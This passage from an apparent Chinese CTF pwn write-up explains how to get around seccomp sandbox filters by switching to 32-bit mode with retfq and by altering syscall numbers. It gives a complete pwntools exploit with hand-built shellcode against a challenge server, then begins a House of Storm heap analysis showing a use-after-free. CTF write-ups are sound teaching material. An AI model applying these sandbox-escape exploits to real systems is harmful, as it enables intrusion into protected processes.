class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这个沙箱规则是非常简单的，可以看到可以直接进行ORW获得flag。</p><p>可以看到这里前面两行做了一个判断，这个判断的效果就是判断当前的架构是否为<code>amd64</code>，如果不是可以看到直接会被kill掉。接着下面两行是验证<code>sys_number</code>的需要小于<code>0x40000000</code>。</p><p>下面主要讲解如果不存上述两条判断的情况，以及一种额外的绕过方式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>这里用题目的沙箱规则做讲解。可以看到这里不存在架构的判断，并且也不存在<code>sys_number</code>大小的判断。不过可以看出来这里不能使用<code>sysnumber+0x40000000</code>的方式来绕过，因为这里判断调用号都不满足时就会直接KILL掉。不过这里可以使用进入x86架构来绕过。</p><p>首先要知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的<code>retfq</code>汇编指令来修改。</p><p>然后再深扒一下<code>retfq</code>指令，这一指令其实存在的是两步，分别是:<code>ret; mov cs, [rsp + 8]</code>所以如果我们事先控制了栈上的内容即可实现切换架构。</p><p>再看一下没有<code>sys_number</code>检验的沙箱规则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这里是随便找的一个例子，可能不是很严谨。可以看到这里验证了架构，但是没有验证<code>sys_number</code>所以使用<code>sys_number|0x40000000</code>在下面的判断中不会被KILL掉，并且在后续执行过程中只会使用只会调用<code>sys_number</code></p><p>下面讲解一下如果上述两条都存在时我们需要调用ORW应该如何处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了<code>openat</code>，所以直接 调用<code>openat</code>，然后除了 read，write，其实还有两个<code>readv</code>，和<code>writev</code>，这些就能绕过限制读取flag</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>有了上述的基础就好做了，首先我们的思路就是想办法转到32位结构执行open，因为在32位的系统调用中open是5所以可以通过过滤。</p><p>不过这里我们需要知道的是在64位架构下的栈地址，在32位架构下是无法解析的，所以我还需要利用mmap生成一个可以放进esp中的地址当作栈。</p><p>其实有了上面的基础就很简单了，就不再赘述了直接给exp了。</p><h3 id="综上，exp-2"><a href="#综上，exp-2" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./shellcode&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x2e],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x2f],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x54],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*change to x86*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3d],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3d],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3e],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3e],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*0x4002DE\nb*0x4002EB\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx,eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"><span class="comment"># context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x29</span></span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*change to x64*/</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x40404089</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*write(1,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of Storm"></a>House of Storm</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题目是十分常规的菜单类堆题，不过这里在main中做了一定处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">new_environment</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  old_addr = &amp;dword_0;</span><br><span class="line">  read(a1, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  buf = buf &gt;&gt; <span class="number">32</span> &lt;&lt; <span class="number">12</span>;</span><br><span class="line">  mallopt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  change_addr(buf, <span class="number">0</span>, v1, v2, v3, v4);</span><br><span class="line">  munmap(old_addr, <span class="number">0x2000</span>uLL);</span><br><span class="line">  munmap((<span class="keyword">char</span> *)old_addr + <span class="number">2101248</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">  old_addr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">change_addr</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// ST28_8</span></span><br><span class="line">  __int64 v2; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = a1 - (_QWORD)old_addr;</span><br><span class="line">  mmap((<span class="keyword">void</span> *)a1, <span class="number">0x2000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)a1, old_addr, <span class="number">0x2000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)a1, <span class="number">0x2000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  mmap((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), <span class="number">0x1000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), (<span class="keyword">char</span> *)old_addr + <span class="number">2101248</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)(a1 + <span class="number">2101248</span>), <span class="number">0x1000</span>uLL, <span class="number">1</span>);</span><br><span class="line">  mmap((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), <span class="number">0x1000</span>uLL, <span class="number">2</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), (<span class="keyword">char</span> *)&amp;_data_start + (_QWORD)old_addr, <span class="number">0x1000</span>uLL);</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)(a1 + <span class="number">2105344</span>), <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">  retaddr += v2;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体调试后得知这里会将process原本的基地址的内容转移到新的mmap出来的地址上去。不知道为什么如果这样干了gdb就会出现报错无法调试。不过这里只是修改process地址对我们利用没什么影响所以本地调试时可以直接patch掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which one do you want to delete?&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;Which one do you want to delete?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &gt; <span class="number">0xF</span> || !ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error: Invalid index!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是这道题目的漏洞点，很明显的UAF。忘了提一下，这里因为mallopt的缘故无法利用fastbin，虽然我们patch掉，但是如果用fastbin远程就打不通了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>题目给的glibc版本时2.23所以我的第一反应就是通过large bin 